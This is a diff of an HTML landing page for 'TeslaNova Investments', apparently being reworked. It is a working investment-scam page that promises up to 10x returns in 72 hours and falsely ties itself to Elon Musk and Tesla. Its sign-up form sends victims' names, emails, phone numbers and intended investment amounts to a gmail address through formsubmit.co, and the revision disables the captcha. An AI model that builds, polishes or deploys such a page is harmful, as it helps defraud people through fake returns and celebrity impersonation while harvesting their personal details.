@@ -1,90 +1,47 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>TeslaNova Investments</title>
-  <link rel="stylesheet" href="style.css" />
-  <style>
-    body {
-      background: white;
-      color: #111;
-      font-family: Arial, sans-serif;
-      margin: 0;
-      padding: 0;
-    }
-    header, footer {
-      background: #f4f4f4;
-      padding: 1rem;
-      text-align: center;
-    }
-    .hero {
-      padding: 4rem 1rem;
-      text-align: center;
-    }
-    .btn {
-      display: inline-block;
-      margin-top: 1rem;
-      padding: 0.8rem 1.5rem;
-      background-color: #e82127;
-      color: white;
-      text-decoration: none;
-      font-weight: bold;
-      border-radius: 5px;
-    }
-    .content {
-      padding: 2rem 1rem;
-      max-width: 800px;
-      margin: 0 auto;
-    }
-    form {
-      display: grid;
-      gap: 1rem;
-      margin-top: 2rem;
-    }
-    input, textarea, button {
-      padding: 0.8rem;
-      font-size: 1rem;
-    }
-    button {
-      background-color: #e82127;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: #c9101c;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TeslaNova Investments</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
-  <header>
-    <img src="logo.png" alt="TeslaNova Logo" style="max-height: 50px;" />
-    <h1>TeslaNova Investments</h1>
-  </header>
+    <header class="hero">
+        <nav>
+            <img src="logo.png" alt="TeslaNova Logo" class="logo">
+            <ul>
+                <li><a href="#about">About</a></li>
+                <li><a href="#signup">Sign Up</a></li>
+            </ul>
+        </nav>
+        <div class="hero-text">
+            <h1>Invest in the Future</h1>
+            <p>Earn up to 10× returns in 72 hours</p>
+            <a href="#signup" class="btn-primary">Get Started</a>
+        </div>
+    </header>
 
-  <section class="hero">
-    <h2>Grow Your Investment 10x — Starting at $100</h2>
-    <p>We help clients earn quickly & reliably. Join now and get a chance to win a Tesla.</p>
-  </section>
+    <section id="about" class="section">
+        <h2>Why TeslaNova?</h2>
+        <p>Inspired by Elon Musk and Tesla, we help you grow your money fast with smart investments.</p>
+    </section>
 
-  <section class="content" id="signup">
-    <h3>Sign Up to Get Started</h3>
-    <form action="https://formsubmit.co/teslanovainvestments@gmail.com" method="POST">
-      <input type="text" name="name" placeholder="Your Full Name" required />
-      <input type="email" name="email" placeholder="Your Email Address" required />
-      <input type="text" name="phone" placeholder="Phone Number" required />
-      <input type="text" name="amount" placeholder="Investment Amount (e.g. $100)" required />
-      <textarea name="message" placeholder="Optional Message (e.g. when to contact you)"></textarea>
-      <button type="submit">📩 Submit</button>
-    </form>
-    <p class="info">After submitting, you’ll receive a confirmation email. Check inbox or spam.</p>
-  </section>
+    <section id="signup" class="section">
+        <h2>Join Now</h2>
+        <form action="https://formsubmit.co/teslanovainvestments@gmail.com" method="POST">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="text" name="name" placeholder="Full Name" required>
+            <input type="email" name="email" placeholder="Email Address" required>
+            <input type="text" name="amount" placeholder="Investment Amount (USD)" required>
+            <textarea name="message" placeholder="Message or Question"></textarea>
+            <button type="submit">Submit</button>
+        </form>
+        <p class="confirmation">We’ll contact you via email after submission.</p>
+    </section>
 
-  <footer>
-    <p>© 2025 TeslaNova Investments | Contact: teslanovainvestments@gmail.com</p>
-  </footer>
+    <footer>
+        <p>&copy; 2025 Elon Musk TeslaNova Investments</p>
+    </footer>
 </body>
 </html>
